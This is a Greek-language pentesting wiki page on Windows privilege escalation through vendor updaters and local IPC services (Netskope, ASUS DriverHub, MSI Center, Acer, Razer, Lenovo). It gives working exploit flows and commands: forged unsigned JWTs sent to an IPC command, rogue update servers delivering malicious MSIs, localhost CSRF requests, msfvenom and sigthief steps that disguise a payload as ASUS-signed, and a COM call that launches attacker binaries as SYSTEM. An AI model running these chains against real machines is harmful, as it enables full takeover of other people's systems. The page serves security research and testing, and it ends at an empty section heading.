# Κατάχρηση εταιρικών αυτόματων ενημερωτών και προνομιούχου IPC (π.χ., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κατηγορία αλυσίδων τοπικής κλιμάκωσης προνομίων στα Windows, οι οποίες εντοπίζονται σε εταιρικούς agents τελικών σημείων και ενημερωτές που εκθέτουν μια εύκολα προσβάσιμη επιφάνεια IPC και μια προνομιούχα ροή ενημέρωσης. Χαρακτηριστικό παράδειγμα είναι το Netskope Client για Windows < R129 (CVE-2025-0309), όπου ένας χρήστης με χαμηλά προνόμια μπορεί να εξαναγκάσει την εγγραφή σε server που ελέγχει ο εισβολέας και στη συνέχεια να παραδώσει ένα κακόβουλο MSI, το οποίο εγκαθιστά η υπηρεσία SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Βασικές ιδέες που μπορείτε να εφαρμόσετε και σε παρόμοια προϊόντα:
- Καταχραστείτε το localhost IPC μιας προνομιούχας υπηρεσίας για να εξαναγκάσετε νέα εγγραφή ή αναδιαμόρφωση προς server του εισβολέα.
- Υλοποιήστε τα endpoints ενημέρωσης του προμηθευτή, παραδώστε ένα μη έμπιστο Trusted Root CA και κατευθύνετε τον ενημερωτή σε ένα κακόβουλο, «υπογεγραμμένο» πακέτο.
- Παρακάμψτε αδύναμους ελέγχους υπογραφής (λίστες επιτρεπόμενων CN), προαιρετικές σημαίες digest και χαλαρές ιδιότητες MSI.
- Αν το IPC είναι «κρυπτογραφημένο», υπολογίστε το κλειδί/IV από αναγνωριστικά μηχανήματος, αναγνώσιμα από όλους, τα οποία είναι αποθηκευμένα στο registry.
- Αν η υπηρεσία περιορίζει τους καλούντες βάσει διαδρομής εκτελέσιμου αρχείου/ονόματος διεργασίας, κάντε injection σε μια διεργασία που είναι στη λίστα επιτρεπόμενων ή εκκινήστε μία σε αναστολή και αρχικοποιήστε το DLL σας με μια ελάχιστη τροποποίηση του περιβάλλοντος νήματος.

Οι προσαρμοσμένες τοπικές υπηρεσίες TCP χρειάζονται τον ίδιο έλεγχο ταυτότητας και ορίων εισόδου, ακόμη κι αν απαιτούν PIN ή άλλα διαπιστευτήρια εφαρμογής. Αντιστοιχίστε τον listener στη διεργασία του και στον λογαριασμό υπηρεσίας που χρησιμοποιεί, έπειτα εξετάστε το ακριβές εγκατεστημένο δυαδικό αρχείο/έκδοση και αν τα πεδία που ελέγχει ο καλών ελέγχονται ως προς το μήκος τους πριν αντιγραφούν σε buffers σταθερού μεγέθους ή χρησιμοποιηθούν για τη σύνταξη εντολής child process. Οι [οδηγίες της Microsoft για υπερχειλίσεις buffer](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) εξηγούν γιατί η μη ελεγμένη εξωτερική είσοδος είναι επικίνδυνη σε προνομιούχο native code. Ένας listener loopback, ένα hardcoded διαπιστευτήριο ή ένα όνομα διεργασίας από μόνο του δεν αποδεικνύει αλλοίωση μνήμης ή εκτέλεση ως SYSTEM· η δυνατότητα πρόσβασης, η εξουσιοδότηση, η διαδρομή εκτέλεσης κώδικα και οι mitigations παραμένουν ξεχωριστές προϋποθέσεις. Περιορίστε τη συνήθη απαρίθμηση σε παθητικές ενέργειες αντί να στέλνετε σε ζωντανή υπηρεσία εισόδους με μήκος ικανό να προκαλέσει κατάρρευση.

---
## 1) Εξαναγκασμός εγγραφής σε server του εισβολέα μέσω localhost IPC

Πολλοί agents περιλαμβάνουν μια διεργασία UI σε user mode, η οποία επικοινωνεί με μια υπηρεσία SYSTEM μέσω localhost TCP χρησιμοποιώντας JSON.

Παρατηρήθηκε στο Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Ροή exploit:
1) Δημιουργήστε ένα JWT enrollment token του οποίου τα claims ελέγχουν τον backend host (π.χ., AddonUrl). Χρησιμοποιήστε alg=None ώστε να μην απαιτείται υπογραφή.
2) Στείλτε το μήνυμα IPC που καλεί την εντολή provisioning, μαζί με το JWT και το όνομα του tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Η υπηρεσία αρχίζει να στέλνει αιτήματα στον rogue server σου για enrollment/config, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Σημειώσεις:
- Αν η επαλήθευση του caller βασίζεται σε path/name, στείλε το αίτημα από ένα allow-listed vendor binary (βλ. §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Παραβίαση του update channel για εκτέλεση κώδικα ως SYSTEM

Μόλις ο client επικοινωνήσει με τον server σου, υλοποίησε τα αναμενόμενα endpoints και κατεύθυνέ τον σε ένα attacker MSI. Τυπική ακολουθία:

1) /v2/config/org/clientconfig → Επέστρεψε JSON config με πολύ σύντομο διάστημα updater, π.χ.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Επιστρέφει ένα PEM CA certificate. Η υπηρεσία το εγκαθιστά στο Local Machine Trusted Root store.
3) /v2/checkupdate → Παρέχει metadata που δείχνουν σε ένα κακόβουλο MSI και μια πλαστή έκδοση.

Παράκαμψη συνηθισμένων ελέγχων που παρατηρούνται στην πράξη:
- Λίστα επιτρεπόμενων Signer CN: η υπηρεσία μπορεί να ελέγχει μόνο αν το Subject CN είναι “netSkope Inc” ή “Netskope, Inc.”. Το rogue CA σου μπορεί να εκδώσει ένα leaf με αυτό το CN και να υπογράψει το MSI.
- Ιδιότητα CERT_DIGEST: συμπερίλαβε μια ακίνδυνη ιδιότητα MSI με όνομα CERT_DIGEST. Δεν γίνεται κανένας έλεγχος κατά την εγκατάσταση.
- Προαιρετικός έλεγχος digest: μια σημαία ρύθμισης (π.χ., check_msi_digest=false) απενεργοποιεί την πρόσθετη cryptographic επικύρωση.

Αποτέλεσμα: η υπηρεσία SYSTEM εγκαθιστά το MSI από
C:\ProgramData\Netskope\stAgent\data\*.msi
και εκτελεί αυθαίρετο κώδικα ως NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Μάθημα για την παράκαμψη ενημερώσεων κώδικα: αν ένας vendor απαντήσει προσθέτοντας μια μικρή λίστα «έμπιστων» domains αντί να πιστοποιεί κρυπτογραφικά την πηγή της ενημέρωσης, αναζήτησε redirectors ή reverse proxies που ανήκουν στον vendor και εξακολουθούν να σου επιτρέπουν να κατευθύνεις την κίνηση. Στην περίπτωση του Netskope, μεταγενέστερη δημόσια έρευνα έδειξε ότι μια λίστα επιτρεπόμενων της εποχής R129 μπορούσε ακόμη να παρακαμφθεί μέσω του `rproxy.goskope.com`, το οποίο προωθούσε περιεχόμενο Azure App Service ελεγχόμενο από τον επιτιθέμενο. Αντιμετώπιζε τις λίστες επιτρεπόμενων hostname ως εμπόδιο, όχι ως όριο εμπιστοσύνης.<sup>[[14]](#references)</sup>

---
## 3) Πλαστογράφηση κρυπτογραφημένων αιτημάτων IPC (όπου υπάρχουν)

Από την έκδοση R127, το Netskope ενσωμάτωσε το IPC JSON σε ένα πεδίο encryptData που μοιάζει με Base64. Η αντίστροφη ανάλυση έδειξε AES με key/IV που προκύπτουν από τιμές μητρώου αναγνώσιμες από οποιονδήποτε χρήστη:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Οι επιτιθέμενοι μπορούν να αναπαράγουν την κρυπτογράφηση και να στέλνουν έγκυρες κρυπτογραφημένες εντολές από έναν τυπικό χρήστη.<sup>[[1]](#references)[[2]](#references)</sup> Γενική συμβουλή: αν ένας agent αρχίσει ξαφνικά να «κρυπτογραφεί» το IPC του, αναζήτησε device IDs, product GUIDs και install IDs στο HKLM που χρησιμοποιούνται ως υλικό.

---
## 4) Παράκαμψη λιστών επιτρεπόμενων καλούντων IPC (έλεγχοι διαδρομής/ονόματος)

Ορισμένες υπηρεσίες προσπαθούν να πιστοποιήσουν τον peer εντοπίζοντας το PID της TCP σύνδεσης και συγκρίνοντας τη διαδρομή/το όνομα του image με τις λίστες επιτρεπόμενων binaries του vendor που βρίσκονται κάτω από το Program Files (π.χ., stagentui.exe, bwansvc.exe, epdlp.exe).

Δύο πρακτικοί τρόποι παράκαμψης:
- DLL injection σε μια διεργασία της λίστας επιτρεπόμενων (π.χ., nsdiag.exe) και proxy του IPC από το εσωτερικό της.
- Εκκίνηση ενός binary της λίστας επιτρεπόμενων σε suspended κατάσταση και bootstrap του proxy DLL χωρίς CreateRemoteThread (βλ. §5), ώστε να ικανοποιούνται οι κανόνες tamper protection που επιβάλλονται από driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection συμβατό με tamper protection: suspended process + NtContinue patch

Τα προϊόντα συχνά περιλαμβάνουν έναν driver minifilter/OB callbacks (π.χ., Stadrv) για να αφαιρεί επικίνδυνα δικαιώματα από handles προς προστατευμένες διεργασίες:
- Process: αφαιρεί τα PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: περιορίζει τα δικαιώματα σε THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ένας αξιόπιστος user-mode loader που τηρεί αυτούς τους περιορισμούς:
1) CreateProcess ενός binary του vendor με CREATE_SUSPENDED.
2) Απόκτησε τα handles που εξακολουθείς να δικαιούσαι: PROCESS_VM_WRITE | PROCESS_VM_OPERATION στη διεργασία και ένα handle thread με THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ή μόνο THREAD_RESUME, αν κάνεις patch στον κώδικα σε γνωστό RIP).
3) Αντικατάστησε το ntdll!NtContinue (ή κάποιο άλλο thunk που είναι εγγυημένα φορτωμένο νωρίς) με ένα μικρό stub που καλεί το LoadLibraryW με τη διαδρομή του DLL σου και έπειτα επιστρέφει.
4) ResumeThread για να εκτελεστεί το stub μέσα στη διεργασία και να φορτώσει το DLL σου.

Επειδή δεν χρησιμοποίησες PROCESS_CREATE_THREAD ή PROCESS_SUSPEND_RESUME σε ήδη προστατευμένη διεργασία (την δημιούργησες εσύ), η πολιτική του driver τηρείται.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Πρακτικά εργαλεία
- Το NachoVPN (plugin του Netskope) αυτοματοποιεί τη δημιουργία rogue CA, την υπογραφή κακόβουλου MSI και την παροχή των απαιτούμενων endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- Το UpSkope είναι ένας προσαρμοσμένος client IPC που δημιουργεί αυθαίρετα μηνύματα IPC (προαιρετικά κρυπτογραφημένα με AES) και περιλαμβάνει injection suspended process, ώστε τα μηνύματα να προέρχονται από ένα binary της λίστας επιτρεπόμενων.<sup>[[4]](#references)</sup>

## 7) Γρήγορη διαδικασία αρχικής αξιολόγησης για άγνωστα σημεία ελέγχου updater/IPC

Όταν εξετάζεις έναν νέο endpoint agent ή μια σουίτα «βοηθητικών» εργαλείων μητρικής πλακέτας, μια γρήγορη διαδικασία συνήθως αρκεί για να διαπιστώσεις αν πρόκειται για ελπιδοφόρο στόχο privesc:<sup>[[6]](#references)</sup>

1) Κατέγραψε τους loopback listeners και αντιστοίχισέ τους με τις διεργασίες του vendor:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Καταγράψτε υποψήφιους named pipes:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Αντλήστε δεδομένα δρομολόγησης από το registry, τα οποία χρησιμοποιούνται από IPC servers βασισμένους σε plugins:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Εξαγάγετε πρώτα τα ονόματα των endpoints, τα κλειδιά JSON και τα command IDs από τον user-mode client. Τα συσκευασμένα frontends Electron/.NET συχνά κάνουν leak ολόκληρο το schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Αναζητήστε την πραγματική συνθήκη εμπιστοσύνης, όχι απλώς τη διαδρομή κώδικα που τελικά εκκινεί τη διεργασία:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Μοτίβα στα οποία αξίζει να δοθεί προτεραιότητα:
- Η χρήση των `CryptQueryObject`/certificate parsing χωρίς `WinVerifyTrust` συνήθως σημαίνει ότι το «υπάρχει πιστοποιητικό» εκλήφθηκε ως «το πιστοποιητικό είναι έμπιστο», επιτρέποντας certificate cloning ή άλλα fake-signer tricks.
- Οι έλεγχοι υποσυμβολοσειράς/επιθήματος στα `Origin`, `Referer`, στις URL λήψεων, στα ονόματα διεργασιών ή στα signer CNs δεν αποτελούν authentication. Το `contains(".vendor.com")` είναι συνήθως exploitable με lookalike domains που ελέγχει ο επιτιθέμενος.
- Αν το low-privileged GUI αποφασίζει ότι «το αρχείο είναι έμπιστο» και ο SYSTEM broker απλώς χρησιμοποιεί αυτό το αποτέλεσμα, η τροποποίηση ή η επανυλοποίηση του client-side DLL/JS συχνά παρακάμπτει εντελώς αυτό το όριο (διαχωρισμένη επικύρωση τύπου Razer).
- Αν ο broker αντιγράφει ένα payload στο `%TEMP%`/`C:\Windows\Temp` και μετά το επικυρώνει ή προγραμματίζει την εκτέλεσή του από εκείνη τη διαδρομή, έλεγξε αμέσως για παράθυρα αντικατάστασης TOCTOU και για γειτονικά plugin modules που εκθέτουν εναλλακτικά wrappers `ExecuteTask()` με ασθενέστερους ελέγχους.<sup>[[6]](#references)</sup>

Για στόχους με εκτεταμένη χρήση named pipes, το PipeViewer είναι ένας γρήγορος τρόπος να εντοπίσεις αδύναμα DACLs και pipes με απομακρυσμένη πρόσβαση, πριν αρχίσεις την εις βάθος ανάλυση του πρωτοκόλλου.<sup>[[11]](#references)</sup>

Αν ο στόχος πιστοποιεί τους callers μόνο βάσει PID, image path ή ονόματος διεργασίας, θεώρησέ το εμπόδιο που καθυστερεί, όχι όριο ασφαλείας: η έγχυση κώδικα στον νόμιμο client ή η δημιουργία σύνδεσης από μια allow-listed διεργασία συχνά αρκεί για να περάσουν οι έλεγχοι του server. Ειδικά για named pipes, [αυτή η σελίδα για την πλαστοπροσωπία client και την κατάχρηση pipe](named-pipe-client-impersonation.md) καλύπτει την τεχνική με περισσότερες λεπτομέρειες.

Για έναν privileged **broker εκκαθάρισης ή επαναφοράς**, εξέτασε το όριο εμπιστοσύνης των διαδρομών, καθώς και το pipe ACL. Ένας caller με χαμηλότερα προνόμια μπορεί να είναι σε θέση να επιλέξει προορισμό επαναφοράς ή να μετονομάσει ένα προσωρινά αποθηκευμένο backup artifact σε κοινόχρηστο κατάλογο, ακόμη κι όταν το εκτελέσιμο του service και ο κατάλογος εγκατάστασής του είναι προστατευμένα. Επιβεβαίωσε ξεχωριστά ότι ο caller μπορεί να καλέσει την εντολή επαναφοράς, να τροποποιήσει ακριβώς το προσωρινά αποθηκευμένο input ή το όνομα αρχείου, ότι ο broker εκτελείται με υψηλότερη ταυτότητα και ότι η λειτουργία επαναφοράς γράφει πράγματι στη επιλεγμένη προστατευμένη διαδρομή. Ένας εγγράψιμος κατάλογος προσωρινής αποθήκευσης ή ένα αναγνώσιμο pipe από μόνο του δεν αποδεικνύει αυθαίρετη εγγραφή με αυξημένα προνόμια· η αντιστοίχιση προορισμού και η συμπεριφορά του service χρειάζονται ανασκόπηση κώδικα ή ελεγχόμενες δοκιμές. Μην εκτελείς άγνωστες εντολές εκκαθάρισης κατά την παθητική απαρίθμηση, επειδή μπορεί να διαγράψουν αρχεία χρηστών.

---
## 8) Modular add-in brokers που κάνουν authentication μόνο με vendor signatures (μοτίβο Lenovo Vantage)

Μια νεότερη παραλλαγή που αξίζει να αναζητήσεις είναι ο **signed-client RPC broker**: μια επιτραπέζια διεργασία Lenovo-signed με χαμηλά προνόμια επικοινωνεί με ένα SYSTEM service, και το service δρομολογεί JSON commands σε ένα σύνολο add-ins που περιγράφονται σε XML και βρίσκονται κάτω από το `%ProgramData%`. Μόλις επιτευχθεί code execution **μέσα σε οποιονδήποτε αποδεκτό signed client**, κάθε contract με `runas="system"` γίνεται μέρος της επιφάνειας επίθεσης.<sup>[[15]](#references)</sup>

Υψηλής αξίας primitives που παρατηρήθηκαν σε έρευνα για το Lenovo Vantage:
- **Εμπιστοσύνη στον caller επειδή φέρει υπογραφή του vendor**: ερευνητές απέκτησαν authenticated context αντιγράφοντας ένα Lenovo-signed EXE σε εγγράψιμο κατάλογο και ικανοποιώντας ένα DLL side-load (`profapi.dll`), ώστε αυθαίρετος κώδικας να εκτελεστεί μέσα σε client που το service ήδη εμπιστευόταν.
- **Ανακάλυψη επιφάνειας επίθεσης μέσω manifest**: τα add-ins δηλώνονται στο `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`· αρκετά contracts εκτελούνται ως `SYSTEM`, επομένως η απαρίθμηση αυτών των manifests συχνά αποκαλύπτει τα πραγματικά privileged verbs ταχύτερα από την αντίστροφη ανάλυση του ίδιου του broker.
- **Bugs ανά εντολή πίσω από το authenticated channel**: αφού εισέλθουν στον έμπιστο client, δημόσιες έρευνες εντόπισαν path-traversal και race conditions σε update/install verbs, κατάχρηση raw SQL σε privileged settings databases και ελέγχους διαδρομών registry που βασίζονταν σε υποσυμβολοσειρές και επέτρεπαν εγγραφές εκτός του προβλεπόμενου hive.

Χρήσιμη αναγνώριση σε έναν στόχο:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Πρακτικό συμπέρασμα: όταν μια σουίτα βοηθητικών εργαλείων εκθέτει έναν broker που πρώτα πιστοποιεί τη **διεργασία-πελάτη** και έπειτα δρομολογεί αιτήματα σε δεκάδες εντολές plugin/add-in, μην σταματάτε αφού παρακάμψετε τον αρχικό έλεγχο εμπιστοσύνης. Εξαγάγετε τον πίνακα manifest/contract και κάντε fuzzing ανεξάρτητα σε κάθε ενέργεια υψηλών προνομίων· το πιστοποιημένο κανάλι συνήθως κρύβει αρκετά bugs δεύτερου σταδίου.

---
## 1) CSRF από browser προς localhost σε προνομιούχα HTTP API (ASUS DriverHub)

Το DriverHub εγκαθιστά μια HTTP υπηρεσία σε user mode (ADU.exe) στη διεύθυνση 127.0.0.1:53000, η οποία αναμένει κλήσεις browser από το https://driverhub.asus.com. Το φίλτρο origin απλώς εκτελεί `string_contains(".asus.com")` στην κεφαλίδα Origin και στις διευθύνσεις URL λήψης που εκτίθενται από το `/asus/v1.0/*`. Επομένως, κάθε host που ελέγχεται από εισβολέα, όπως το `https://driverhub.asus.com.attacker.tld`, περνά τον έλεγχο και μπορεί να στείλει αιτήματα που αλλάζουν την κατάσταση μέσω JavaScript.<sup>[[6]](#references)</sup> Δείτε τα [βασικά στοιχεία του CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) για επιπλέον μοτίβα παράκαμψης.

Πρακτική ροή:
1) Καταχωρίστε ένα domain που περιέχει το `.asus.com` και φιλοξενήστε εκεί μια κακόβουλη ιστοσελίδα.
2) Χρησιμοποιήστε `fetch` ή XHR για να καλέσετε ένα προνομιούχο endpoint (π.χ. `Reboot`, `UpdateApp`) στο `http://127.0.0.1:53000`.
3) Στείλτε το JSON body που αναμένει ο handler – το packed frontend JS εμφανίζει παρακάτω το schema.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Ακόμη και το PowerShell CLI που εμφανίζεται παρακάτω πετυχαίνει όταν γίνεται spoofing της κεφαλίδας Origin, ώστε να έχει την έμπιστη τιμή:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Οποιαδήποτε επίσκεψη browser στον ιστότοπο του attacker γίνεται επομένως ένα local CSRF με 1 click (ή 0 click μέσω `onload`), που θέτει σε λειτουργία ένα SYSTEM helper.

---
## 2) Μη ασφαλής επαλήθευση code-signing και cloning πιστοποιητικού (ASUS UpdateApp)

Το `/asus/v1.0/UpdateApp` κατεβάζει αυθαίρετα εκτελέσιμα που ορίζονται στο JSON body και τα αποθηκεύει προσωρινά στο `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Η επικύρωση του URL λήψης χρησιμοποιεί την ίδια λογική substring, οπότε γίνεται δεκτό το `http://updates.asus.com.attacker.tld:8000/payload.exe`. Μετά τη λήψη, το ADU.exe απλώς ελέγχει ότι το PE περιέχει υπογραφή και ότι το Subject string αντιστοιχεί στην ASUS πριν το εκτελέσει – χωρίς `WinVerifyTrust` ή επικύρωση αλυσίδας.

Για να οπλοποιήσετε τη ροή:
1) Δημιουργήστε ένα payload (π.χ., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Κλωνοποιήστε τον signer της ASUS στο payload (π.χ., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Φιλοξενήστε το `pwn.exe` σε domain-μιμητή του `.asus.com` και ενεργοποιήστε το UpdateApp μέσω του παραπάνω browser CSRF.

Επειδή τόσο τα φίλτρα Origin όσο και τα φίλτρα URL βασίζονται σε substring και ο έλεγχος signer συγκρίνει μόνο strings, το DriverHub κατεβάζει και εκτελεί το binary του attacker με τα αυξημένα δικαιώματά του.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU στις διαδρομές αντιγραφής/εκτέλεσης του updater (MSI Center CMD_AutoUpdateSDK)

Η υπηρεσία SYSTEM του MSI Center εκθέτει ένα TCP protocol, όπου κάθε frame είναι `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Το βασικό component (Component ID `0f 27 00 00`) παρέχει το `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ο handler του:
1) Αντιγράφει το παρεχόμενο εκτελέσιμο στο `C:\Windows\Temp\MSI Center SDK.exe`.
2) Επαληθεύει την υπογραφή μέσω του `CS_CommonAPI.EX_CA::Verify` (το subject του certificate πρέπει να είναι ίσο με “MICRO-STAR INTERNATIONAL CO., LTD.” και το `WinVerifyTrust` να πετύχει).
3) Δημιουργεί scheduled task που εκτελεί το προσωρινό αρχείο ως SYSTEM με arguments ελεγχόμενα από τον attacker.

Το αντιγραμμένο αρχείο δεν κλειδώνεται ανάμεσα στην επαλήθευση και την `ExecuteTask()`. Ένας attacker μπορεί να:
- Στείλει το Frame A με αναφορά σε ένα νόμιμο binary υπογεγραμμένο από την MSI (εξασφαλίζει ότι ο έλεγχος υπογραφής θα πετύχει και το task θα μπει στην ουρά).
- Κάνει race με επαναλαμβανόμενα μηνύματα Frame B που δείχνουν σε ένα κακόβουλο payload, αντικαθιστώντας το `MSI Center SDK.exe` αμέσως μετά την ολοκλήρωση της επαλήθευσης.

Όταν ενεργοποιηθεί ο scheduler, εκτελεί το αντικαταστημένο payload ως SYSTEM, παρότι είχε επικυρώσει το αρχικό αρχείο. Για αξιόπιστη εκμετάλλευση χρησιμοποιούνται δύο goroutines/threads που στέλνουν μαζικά το CMD_AutoUpdateSDK μέχρι να κερδηθεί το παράθυρο TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Κατάχρηση custom IPC επιπέδου SYSTEM και impersonation (MSI Center + Acer Control Centre)

### TCP command sets του MSI Center
- Κάθε plugin/DLL που φορτώνεται από το `MSI.CentralServer.exe` λαμβάνει ένα Component ID αποθηκευμένο στο `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Τα πρώτα 4 bytes ενός frame επιλέγουν αυτό το component, επιτρέποντας στους attackers να δρομολογούν εντολές σε αυθαίρετα modules.
- Τα plugins μπορούν να ορίζουν δικούς τους task runners. Το `Support\API_Support.dll` εκθέτει το `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` και καλεί απευθείας το `API_Support.EX_Task::ExecuteTask()` **χωρίς επικύρωση υπογραφής** – οποιοσδήποτε local user μπορεί να του υποδείξει το `C:\Users\<user>\Desktop\payload.exe` και να εκτελέσει κώδικα ως SYSTEM με προβλέψιμο τρόπο.
- Η υποκλοπή loopback traffic με Wireshark ή η ανάλυση των .NET binaries στο dnSpy αποκαλύπτει γρήγορα την αντιστοίχιση Component ↔ command· στη συνέχεια, custom clients σε Go/Python μπορούν να επαναλάβουν τα frames.<sup>[[6]](#references)</sup>

### Named pipes του Acer Control Centre και επίπεδα impersonation
- Το `ACCSvc.exe` (SYSTEM) εκθέτει το `\\.\pipe\treadstone_service_LightMode`, και η discretionary ACL του επιτρέπει remote clients (π.χ., `\\TARGET\pipe\treadstone_service_LightMode`). Η αποστολή του command ID `7` με μια διαδρομή αρχείου καλεί τη ρουτίνα εκκίνησης διεργασιών της υπηρεσίας.
- Η client library κάνει serialize ένα magic terminator byte (113) μαζί με τα args. Η δυναμική ανάλυση με Frida/`TsDotNetLib` (δείτε το [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) για συμβουλές instrumentation) δείχνει ότι ο native handler αντιστοιχίζει αυτή την τιμή σε ένα `SECURITY_IMPERSONATION_LEVEL` και integrity SID πριν καλέσει το `CreateProcessAsUser`.
- Αντικαθιστώντας το 113 (`0x71`) με 114 (`0x72`), η εκτέλεση περνά στον generic κλάδο, ο οποίος διατηρεί ολόκληρο το SYSTEM token και ορίζει SID υψηλής ακεραιότητας (`S-1-16-12288`). Συνεπώς, το binary που εκκινείται εκτελείται ως SYSTEM χωρίς περιορισμούς, τόσο τοπικά όσο και μεταξύ μηχανημάτων.
- Συνδυάστε το με το εκτεθειμένο flag του installer (`Setup.exe -nocheck`) για να εγκαταστήσετε το ACC ακόμη και σε lab VMs και να δοκιμάσετε το pipe χωρίς hardware του vendor.<sup>[[6]](#references)</sup>

Αυτά τα IPC bugs αναδεικνύουν γιατί οι υπηρεσίες localhost πρέπει να επιβάλλουν mutual authentication (ALPC SIDs, φίλτρα `ImpersonationLevel=Impersonation`, token filtering) και γιατί ο helper «εκτέλεση αυθαίρετου binary» κάθε module πρέπει να χρησιμοποιεί τις ίδιες επαληθεύσεις signer.

---
## 3) COM/IPC “elevator” helpers που βασίζονται σε αδύναμη user-mode επικύρωση (Razer Synapse 4)

Το Razer Synapse 4 πρόσθεσε ένα ακόμη χρήσιμο μοτίβο σε αυτή την κατηγορία: ένας χρήστης με χαμηλά δικαιώματα μπορεί να ζητήσει από ένα COM helper να εκκινήσει μια διεργασία μέσω του `RzUtility.Elevator`, ενώ η απόφαση εμπιστοσύνης ανατίθεται σε ένα user-mode DLL (`simple_service.dll`) αντί να επιβάλλεται αξιόπιστα εντός του προνομιακού ορίου.

Παρατηρημένη διαδρομή εκμετάλλευσης:
- Δημιουργήστε το COM object `RzUtility.Elevator`.
- Καλέστε το `LaunchProcessNoWait(<path>, "", 1)` για να ζητήσετε εκκίνηση με αυξημένα δικαιώματα.
- Στο δημόσιο PoC, το PE-signature gate μέσα στο `simple_service.dll` γίνεται patch out πριν από την αποστολή του αιτήματος, επιτρέποντας την εκκίνηση οποιουδήποτε εκτελέσιμου επιλέξει ο attacker.<sup>[[6]](#references)[[10]](#references)</sup>

Ελάχιστη κλήση PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Γενικό συμπέρασμα: όταν κάνετε reverse engineering σε «helper» suites, μην περιορίζεστε σε localhost TCP ή named pipes. Ελέγξτε για COM classes με ονόματα όπως `Elevator`, `Launcher`, `Updater` ή `Utility` και, στη συνέχεια, επαληθεύστε αν η privileged service επικυρώνει η ίδια το target binary ή απλώς εμπιστεύεται ένα αποτέλεσμα που υπολογίζει ένα patchable user-mode client DLL. Αυτό το μοτίβο δεν περιορίζεται στη Razer: κάθε split design όπου ο high-privilege broker χρησιμοποιεί μια απόφαση allow/deny από την πλευρά του low-privilege αποτελεί πιθανή επιφάνεια privesc.


---
## Εκτέλεση προβλέψιμου temp script κατά την επιδιόρθωση MSI (Checkmk Agent / CVE-2024-0670)

